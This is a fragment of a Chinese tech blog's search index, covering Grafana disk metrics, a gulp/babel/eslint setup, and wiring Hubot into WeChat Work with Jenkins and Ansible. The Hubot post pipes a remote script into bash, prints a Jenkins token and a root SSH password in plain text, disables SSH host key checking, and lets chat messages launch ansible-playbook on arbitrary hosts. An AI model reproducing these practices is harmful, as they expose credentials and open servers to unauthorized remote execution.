class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_read_bytes_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 6.4101677568e+11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HELP node_disk_written_bytes_total The total number of bytes written successfully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TYPE node_disk_written_bytes_total counter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enode_disk_written_bytes_total{device\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;sda\u0026#34;} 1.15483858333184e+14\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看出是上面 4 个指标，这四个指标都是 counter 计数器类型的，都是只增不减的。\u003c/p\u003e","title":"Grafana画出prometheus的图"},{"content":"最近开始弄hubot，顺带也开始学习 javascript ，首先从单独一个 nodejs 项目开始：\nnvm 和 node 的安装使用在前面已经说过了： Nodejs多版本的安装与管理\n新建一个项目目录，build01\n然后在其下建立如下目录结构：\nmkdir build01 cd build01 mkdir es6 dist mkdir public cd public mkdir es6 dist 解释一下，es6 下放的是服务器端的源代码，dist 下放的是服务器端处理过的源代码。\npublic/es6 放的是浏览器端的源代码，public/dist 放的是浏览器端处理过的源代码。\n一、安装gulp和babel babel 是用来做 js 格式转换的，注意，原有的 babel-preset-es2015 已经不适用了。\nnpm install --save-dev gulp gulp-babel babel-preset-env@next 生成一个.babelrc 文件，内容就一行\n{ \u0026#34;presets\u0026#34;: [\u0026#34;env\u0026#34;] } 在 es6 目录下，建立一个测试的 test.js 文件，内容如下：\n\u0026#39;use strict\u0026#39;; const sentences = [ { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, ]; function say({ subject, verb, object }) { console.log(`${subject} ${verb} ${object}`); } for ( let s of sentences) { say(s); } 仔细看，上面这个文件用到了 es6 的语法，对象的解构，of语法。\n我们来用 babel 把它转换一下，变成 es5 的语法\n在build01目录下，生成gulpfile.js，内容如下：\nconst gulp = require(\u0026#39;gulp\u0026#39;); const babel = require(\u0026#39;gulp-babel\u0026#39;); gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ gulp.src(\u0026#34;es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); done(); }); 注意上面，**表示洞穿所有子目录。运行 gulp ，就会在 dist 目录下生成新的 test.js ，内容如下：\n\u0026#39;use strict\u0026#39;; var sentences = [{ subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }]; function say(_ref) { var subject = _ref.subject, verb = _ref.verb, object = _ref.object; console.log(\u0026#34;\u0026#34;.concat(subject, \u0026#34; \u0026#34;).concat(verb, \u0026#34; \u0026#34;).concat(object)); } for (var _i = 0; _i \u0026lt; sentences.length; _i++) { var s = sentences[_i]; say(s); } 仔细看，es6 的语法 变成 es5 的语法了。\n二、安装eslint babel 是对语法进行转换，那么 eslint 就是对语法作出规范，很多人吃 airbnb 那一套规则。\nnpm install --save-dev eslint gulp-eslint gulp-if 安装完成后执行命令进行初始化：\neslint --init 会提问一堆问题：\nHow would you like to use ESLint? … ▸ To check syntax, find problems, and enforce code style What type of modules does your project use? … ▸ JavaScript modules (import/export) Which framework does your project use? … React Vue.js ▸ None of these Does your project use TypeScript? ‣ No / Yes #两个都选哦 Where does your code run? … (Press \u0026lt;space\u0026gt; to select, \u0026lt;a\u0026gt; to toggle all, \u0026lt;i\u0026gt; to invert selection) ✔ Browser ✔ Node How would you like to define a style for your project? … ▸ Answer questions about your style ✔ What format do you want your config file to be in? · JSON ✔ What style of indentation do you use? · 4 ✔ What quotes do you use for strings? · single ✔ What line endings do you use? · unix ✔ Do you require semicolons? · Yes 最后得到文件 .eslintrc.json\n{ \u0026#34;env\u0026#34;: { \u0026#34;browser\u0026#34;: true, \u0026#34;es2021\u0026#34;: true, \u0026#34;node\u0026#34;: true }, \u0026#34;extends\u0026#34;: \u0026#34;eslint:recommended\u0026#34;, \u0026#34;parserOptions\u0026#34;: { \u0026#34;ecmaVersion\u0026#34;: 13, \u0026#34;sourceType\u0026#34;: \u0026#34;module\u0026#34; }, \u0026#34;rules\u0026#34;: { \u0026#34;indent\u0026#34;: [ \u0026#34;error\u0026#34;, 4 ], \u0026#34;linebreak-style\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;unix\u0026#34; ], \u0026#34;quotes\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;single\u0026#34; ], \u0026#34;semi\u0026#34;: [ \u0026#34;error\u0026#34;, \u0026#34;always\u0026#34; ] } } 这里注意，要改两个地方：\n\u0026#34;es2021\u0026#34;: true, 改成 \u0026#34;es6\u0026#34;: true, \u0026#34;ecmaVersion\u0026#34;: 13, 改成 \u0026#34;ecmaVersion\u0026#34;: 10, 然后我们改写一下 gulpfile.js，增加 eslint 的部分\nconst gulp = require(\u0026#39;gulp\u0026#39;); const babel = require(\u0026#39;gulp-babel\u0026#39;); const eslint = require(\u0026#39;gulp-eslint\u0026#39;); const gulpIf = require(\u0026#39;gulp-if\u0026#39;); function isFixed(file) { return file.eslint !== null \u0026amp;\u0026amp; file.eslint.fixed; } gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ gulp.src([\u0026#34;es6/**/*.js\u0026#34;, \u0026#34;public/**/*.js\u0026#34;]) .pipe(eslint({fix: true})) .pipe(eslint.format()) .pipe(gulpIf(isFixed, gulp.dest(file =\u0026gt; file.base))) .pipe(eslint.failAfterError()); gulp.src(\u0026#34;es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) .pipe(babel()) .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); done(); }); 再运行 gulp ，会把 es6/test.js 给格式化好，对比一下原文件就知道了，ident 被调整成4个空格了：\n\u0026#39;use strict\u0026#39;; const sentences = [ { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, ]; function say({ subject, verb, object }) { console.log(`${subject} ${verb} ${object}`); } for ( let s of sentences) { say(s); } ","permalink":"https://rendoumi.com/posts/20220104-javascript_babel_eslint/","summary":"\u003cp\u003e最近开始弄hubot，顺带也开始学习 javascript ，首先从单独一个 nodejs 项目开始：\u003c/p\u003e\n\u003cp\u003envm 和 node 的安装使用在前面已经说过了：  \u003ca href=\"/posts/20211217-nodejs_nvm/\"\u003eNodejs多版本的安装与管理\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e新建一个项目目录，build01\u003c/p\u003e\n\u003cp\u003e然后在其下建立如下目录结构：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir build01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e build01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir es6 dist\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir es6 dist \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20220104160358593\" loading=\"lazy\" src=\"/posts/20220104-javascript_babel_eslint/image-20220104160358593.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解释一下，es6 下放的是服务器端的源代码，dist 下放的是服务器端处理过的源代码。\u003c/p\u003e\n\u003cp\u003epublic/es6 放的是浏览器端的源代码，public/dist 放的是浏览器端处理过的源代码。\u003c/p\u003e\n\u003ch2 id=\"一安装gulp和babel\"\u003e一、安装gulp和babel\u003c/h2\u003e\n\u003cp\u003ebabel 是用来做 js 格式转换的，注意，原有的 babel-preset-es2015 已经不适用了。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install --save-dev gulp gulp-babel babel-preset-env@next\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e生成一个\u003ccode\u003e.babelrc\u003c/code\u003e 文件，内容就一行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e{ \u0026#34;presets\u0026#34;: [\u0026#34;env\u0026#34;] }\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在 es6 目录下，建立一个测试的 \u003ccode\u003etest.js\u003c/code\u003e 文件，内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e\u0026#39;use strict\u0026#39;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003econst sentences\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;,  object: \u0026#39;great\u0026#39; },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  { subject: \u0026#39;Elephants\u0026#39;,  verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; },\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efunction say({ subject, verb, object }) {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003econsole.log(`${subject} ${verb} ${object}`);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor ( let s of sentences) {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esay(s);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e仔细看，上面这个文件用到了 es6 的语法，对象的解构，of语法。\u003c/p\u003e","title":"Javascript的项目与babel和eslint"},{"content":"Hubot是一个通用的聊天机器人，能和很多聊天软件集成，比如slack、rockchat、telegram、企业微信、IRC等。\n公司用的是企业微信，之前用群机器人和 prometheus 集成，发送各种告警信息，但是群机器人无法接收消息；同时我们想集成进去很多自定义命令，比如发送指令就开始 jenkins build，发送 ansible 指令执行，发送流量图就自动把机房的流量图发过来，这个群机器人就用不成了。所以必须再直接一些，构建一个企业微信的应用。\n一、企业微信安装前准备 安装前需要在企业微信中拿到4个信息：\nWECHATWORK_CORP_ID WECHATWORK_APP_AGENT_ID WECHATWORK_APP_SECRET WECHATWORK_AES_KEY 首先联系企业微信管理员新增一个应用：\n在“管理后台-我的企业”中可以获得地一个信息，企业 ID 信息，CORP_ID ：\n拿拿 在“管理后台-应用管理-点击某具体应用-详情”页中可以获得二、三个信息， APP_AGENT_ID 和 APP_SECRET\n第四个 AES_KEY 就比较麻烦了，我们进入这个应用，点击配置的图标：\n然后进入，点击启用 API 接收\n然后设置一下\nurl 填写 https://hubot.rendoumi.com/wechatwork/webhook Token 点随机获取 EncodingAESKey 点随机获取，这就是具体的 AESKey 了 然后点击保存，这里必然会失败！没有关系，因为我们还没有装hubot呢。我们把这三个地方先记录下来，随后再来点击保存。\n二、Hubot 安装前准备 1、注意上面地址：URL 地址是 https ，然后 hubot 的缺省地址是 http://xxx:8080 ，这样如果前面没有证书卸载的设备，就得搭建一个Nginx（haproxy、traefik）来代理 https 443端口到8080。\n2、Hubot 是支持 Coffeescript 和 nodejs 的，从它的 Adapters 网页看\nhttps://hubot.github.com/docs/adapters/development/\n里面都是 coffee 味的单箭头函数，导致不太熟悉的八戒以为在 wechatwork module导出的时候也应该用单箭头函数，结果就悲剧了。\n所以务必清楚，Adapter 的语法是 js，普通自建自动回复script可以用coffeescript，后面会详细说这一点。\n3、安装Hubot必须新建一个普通用户，不能用 root 装\n用 root 会导致 nodejs 一堆报错，八戒新建了一个用户 bot，家目录/home/bot，然后再在这下面建立/home/bot/myhubot，在这个目录下安装。\n理由是这个如果直接装在这个用户的 home 目录下，会导致这个用户只能有这一个用途了，目录结构太浅，一堆文件\n4、Hubot的变量引入都是通过环境变量引入的\n所以无论什么wechatwork还是jenkins，都需要通过环境变量导入变量\n三、安装Hubot 首先安装nvm，参看文章 Nodejs多版本的安装与管理\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash 安装的时候最好加个 https_proxy 代理，因为这个 shell 脚本不翻墙很难下下来。\n然后务必关了代理，退出终端并重新进入，安装 nodejs 的最新版本\nnvm ls-remote nvm install v16.13.1 nvm list 确认一下，nodejs 的版本缺省是 v16.13.1\n这里千万不要手欠把 npm 的源换成国内的腾讯等，就是国外源\n然后安装hubot，并初始化\nsu - bot npm install -g yo generator-hubot mkdir /home/bot/myhubot cd /home/bot/myhubot yo hubot 会问几个问题：\nOwer：写自己邮箱就行 Bot name: bot Description: rendoumi corp Bot adapter: campfire 注意最后一个，选campfire就好，我们稍后再装wechatwork\n_____________________________ / \\ //\\ | Extracting input for | ////\\ _____ | self-replication process | //////\\ /_____\\ \\ / ======= |[^_/\\_]| /---------------------------- | | _|___@@__|__ +===+/ /// \\_\\ | |_\\ /// HUBOT/\\\\ |___/\\// / \\\\ \\ / +---+ \\____/ | | | //| +===+ \\// |xx| ? Owner zhangranrui@rendoumi.com ? Bot name bot ? Description rendoumi corp ? Bot adapter campfire 然后就会是漫长的等待：\n最后会报几个警告，不用管，忽略即可。\nnpm notice created a lockfile as package-lock.json. You should commit this file. + hubot-help@1.0.1 + hubot-google-images@0.2.7 + hubot-rules@1.0.0 + hubot-shipit@0.2.1 + hubot-redis-brain@1.0.0 + hubot-google-translate@0.2.1 + hubot-diagnostics@1.0.0 + hubot-scripts@2.17.2 + hubot@3.3.2 + hubot-maps@0.0.3 + hubot-heroku-keepalive@1.0.3 + hubot-pugme@0.1.1 added 99 packages from 53 contributors and audited 99 packages in 20.176s 2 packages are looking for funding run `npm fund` for details found 1 low severity vulnerability run `npm audit fix` to fix them, or `npm audit` for details 我们先跑一下，简单测一下功能，我们的bot name输入的是bot\ncd /home/bot/myhubot ./bin/hubot #进入后 bot ping #得到回应 PONG 这样就装好了 hubot，我们做一下修改，去掉 heroku 和 redis，否则会不停丢出报错信息，但是不要用 npm 去删除这两个包，放着那里备用也不占多少空间的\ncd /home/bot/myhubot vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-heroku-keepalive\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-redis-brain\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34; ] #去掉下面两行 hubot-heroku-keepalive hubot-redis-brain 三、安装微信 Adapter Adapter 插件，hubot是一套系统，通过各种插件跟各种聊天软件进行交互\n微信插件原始地址：https://github.com/billtt/hubot-wechatwork\n八戒稍微改了一下：https://github.com/zhangrr/hubot-wechatwork\n主要是添加了个自动回应和添加了一些调试信息，否则不知道加载成不成功。\n#先装那个老的 cd /home/bot/myhubot npm install hubot-wechatwork #覆盖掉老的模块 cd /home/bot/myhubot/node_modules git clone https://github.com/zhangrr/hubot-wechatwork 启动之前普及一下 hubot 基本知识，hubot 中变量的传入都是通过环境变量导入的，启动测试一下wechatwork\nexport WECHATWORK_CORP_ID=aaaa export WECHATWORK_APP_AGENT_ID=bbbb export WECHATWORK_APP_SECRET=cccc export WECHATWORK_AES_KEY=dddd cd /home/bot/myhubot ./bin/hubot -a wechatwork 看到信息，INFO Yunwei: loading wechatwork Adapter，说明启动没啥毛病\n然后我们回到企业微信这个应用的应用管理，点击保存接收消息服务器配置，这次就应该能成功了。\n测试一下，我们在企业微信中，对这个应用机器人私聊，发个 hi：\n再发个help，会冒出一堆信息\n然后我们可以试试指令，再发个ping，机器人回PONG，这就算正常工作了\n同时我们在终端也可以看到接收到的消息\n要注意的命令： wechatwork 有一条命令 chat create CHATID USER1,USER2,USER3,\u0026hellip;\n解释一下，是用来建立一个企业微信群聊的，群主默认是第一个人：\nchatid 是指一个群聊的 id 号，格式是字母+数字，比如yunwei001，这个一旦创建就无法销毁，会永远保存在企业微信那里，切切记住！！！\nuser1,user2 这种是员工企业微信的id，通常是用户名全称，比如 zhangrenren,liudaqiang\n所以说的时候务必要小心，万万记住 chatid 一旦建立就无法收回。\n之后可以调用 sendChatMessage 来给群聊发送消息。\n四、准备systemd启动hubot 这样不能每次用个终端启动 hubot 吧，写个 systemd 文件来处理吧\n由于我们用到了nvm，这里确实需要一些技巧，cat /etc/systemd/system/hubot.service\n[Unit] Description=Hubot Requires=network.target After=network.target [Service] Type=simple WorkingDirectory=/home/bot/myhubot User=bot Restart=always TimeoutStartSec=10 RestartSec=10 ; Configure Hubot environment variables, use quotes around vars with whitespace as shown below. ; Environment=\u0026#34;HUBOT_SLACK_TOKEN=SLACK_TOKEN\u0026#34; ; Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; ; Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; Environment=\u0026#34;NODE_VERSION=default\u0026#34; Environment=\u0026#34;WECHATWORK_CORP_ID=aaaa\u0026#34; Environment=\u0026#34;WECHATWORK_APP_AGENT_ID=bbbb\u0026#34; Environment=\u0026#34;WECHATWORK_APP_SECRET=cccc\u0026#34; Environment=\u0026#34;WECHATWORK_AES_KEY=dddd\u0026#34; ExecStart=/home/bot/.nvm/nvm-exec /home/bot/myhubot/bin/hubot --adapter wechatwork [Install] WantedBy=multi-user.target 注意上面，我们指定了环境变量 NODE_VERSION=default，以及最下的 ExecStart，确定用 nvm-exec 引动 node\n另外把 wechatwork 所需的4个参数也放进环境变量中，这样重启就可以了\nsystemctl daemon-reload systemctl start hubot 五、集成jenkins 准备知识，我们必须在 jenkins 拿到用户名和 token（token是用来代替密码的），用来访问 jenkins\n首先登录 jenkins，访问网址：$JENKINS_URL/me/configure，新建一个 API Token，记录下来\n用法很简单：token替代密码用于 url 认证即可。\ncd /home/bot/myhubot npm install hubot-jenkins-optimised #编辑external-scripts.json vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34;, \u0026#34;hubot-jenkins-optimised\u0026#34; ] #上面增加了一行 hubot-jenkins-optimised #编辑 /etc/systemd/system/hubot.service ，添加 jenkins 的环境变量 #jenkins的用户名是pe，所有auth是 \u0026#34;pe:x837491lkaflajksdf7\u0026#34; ...... Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; ...... # 重启 hubot systemctl daemon-reload systemctl restart hubot 然后我们私聊这个机器人，对它说: jenkins list，就可以看到项目了， jenkins b 3 就可以开始build第三个项目了，所有命令可以通过对机器人说 help 来获得\n六、集成ansible 集成 ansible，其实就是集成一个 shell，也很简单\ncd /home/bot/myhubot npm install hubot-script-shellcmd #编辑external-scripts.json vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34;, \u0026#34;hubot-jenkins-optimised\u0026#34;, \u0026#34;hubot-script-shellcmd\u0026#34; ] #上面增加了一行 hubot-script-shellcmd #把shellcmd目录下的bash目录，复制一份到/home/bot/myhubot/bash cp -R node_modules/hubot-script-shellcmd/bash ./ #我们把ansible的yml都放到/homebot/myhubot/bash/ansible目录下 cd /home/bot/myhubot/bash mkdir ansible #把ansible-playbook的yml都放进去 .... #然后编写命令脚本 cd /home/bot/myhubot/bash/handles cat \u0026lt; EOF \u0026gt;\u0026gt; fuse #!/bin/bash if [ -n \u0026#34;$1\u0026#34; ] ; then if [ -n \u0026#34;$2\u0026#34; ] ; then ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=$2\u0026#34; else ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=/\u0026#34; fi fi exit 0 EOF #给执行权 chmod 755 /home/bot/myhubot/bash/handles/fuse #重启hubot systemctl restart hubot check-disk.yml 的真身，是在远程机器上调用本机才有的rust dust命令，来算出远程机器的某个目录的使用情况\n--- - name: check machine disk space hosts: \u0026#34;{{ ip }}\u0026#34; gather_facts: false vars: - ip: \u0026#34;{{ ip }}\u0026#34; - fs: \u0026#34;{{ fs }}\u0026#34; - ansible_ssh_user: \u0026#34;root\u0026#34; - ansible_ssh_pass: \u0026#34;Fuck2021!\u0026#34; - ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; - host_key_checking: False tasks: - name: Run a script with arguments (using \u0026#39;cmd\u0026#39; parameter) ansible.builtin.script: cmd: /usr/local/bin/dust -bcr {{ fs }} register: output - debug: var=output.stdout_lines 我们在企业微信对机器说 shell ，就会得到所有命令列表\n对它说 shell fuse 172.19.16.1 /export ，就会把本机才有的 dust 命令，拷贝到172.19.16.1的机器上，并对 /export 执行，得到占磁盘空间最大的文件和目录。\n参考资料： https://qydev.weixin.qq.com/wiki/index.php?title=%E5%8F%91%E9%80%81%E6%8E%A5%E5%8F%A3%E8%AF%B4%E6%98%8E\nhttp://sd.blackball.lv/library/Automation_and_Monitoring_with_Hubot_(2014).pdf\n","permalink":"https://rendoumi.com/posts/20211222-hubot_wechat/","summary":"\u003cp\u003eHubot是一个通用的聊天机器人，能和很多聊天软件集成，比如slack、rockchat、telegram、企业微信、IRC等。\u003c/p\u003e\n\u003cp\u003e公司用的是企业微信，之前用群机器人和 prometheus 集成，发送各种告警信息，但是群机器人无法接收消息；同时我们想集成进去很多自定义命令，比如发送指令就开始 jenkins build，发送 ansible 指令执行，发送流量图就自动把机房的流量图发过来，这个群机器人就用不成了。所以必须再直接一些，构建一个企业微信的应用。\u003c/p\u003e\n\u003ch2 id=\"一企业微信安装前准备\"\u003e一、企业微信安装前准备\u003c/h2\u003e\n\u003cp\u003e安装前需要在企业微信中拿到4个信息：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWECHATWORK_CORP_ID\u003c/li\u003e\n\u003cli\u003eWECHATWORK_APP_AGENT_ID\u003c/li\u003e\n\u003cli\u003eWECHATWORK_APP_SECRET\u003c/li\u003e\n\u003cli\u003eWECHATWORK_AES_KEY\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e首先联系企业微信管理员新增一个应用：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222144935256\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222144935256.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在“管理后台-我的企业”中可以获得地一个信息，企业 ID 信息，CORP_ID  ：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222144654696\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222144654696.png\"\u003e拿拿  在“管理后台-应用管理-点击某具体应用-详情”页中可以获得二、三个信息， APP_AGENT_ID 和 APP_SECRET\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222150424143\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222150424143.png\"\u003e\u003c/p\u003e\n\u003cp\u003e第四个 AES_KEY 就比较麻烦了，我们进入这个应用，点击配置的图标：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151155307\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151155307.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后进入，点击启用 API 接收\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151325525\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151325525.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后设置一下\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eurl 填写 \u003ca href=\"https://hubot.rendoumi.com/wechatwork/webhook\"\u003ehttps://hubot.rendoumi.com/wechatwork/webhook\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eToken 点随机获取\u003c/li\u003e\n\u003cli\u003eEncodingAESKey 点随机获取，这就是具体的 AESKey 了\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151552345\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151552345.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后点击保存，这里必然会失败！没有关系，因为我们还没有装hubot呢。我们把这三个地方先记录下来，随后再来点击保存。\u003c/p\u003e\n\u003ch2 id=\"二hubot-安装前准备\"\u003e二、Hubot 安装前准备\u003c/h2\u003e\n\u003cp\u003e1、注意上面地址：URL 地址是 https ，然后 hubot 的缺省地址是 http://xxx:8080 ，这样如果前面没有证书卸载的设备，就得搭建一个Nginx（haproxy、traefik）来代理 https 443端口到8080。\u003c/p\u003e\n\u003cp\u003e2、Hubot 是支持 Coffeescript 和 nodejs 的，从它的 Adapters 网页看\u003c/p\u003e\n\u003cp\u003e\u003ca 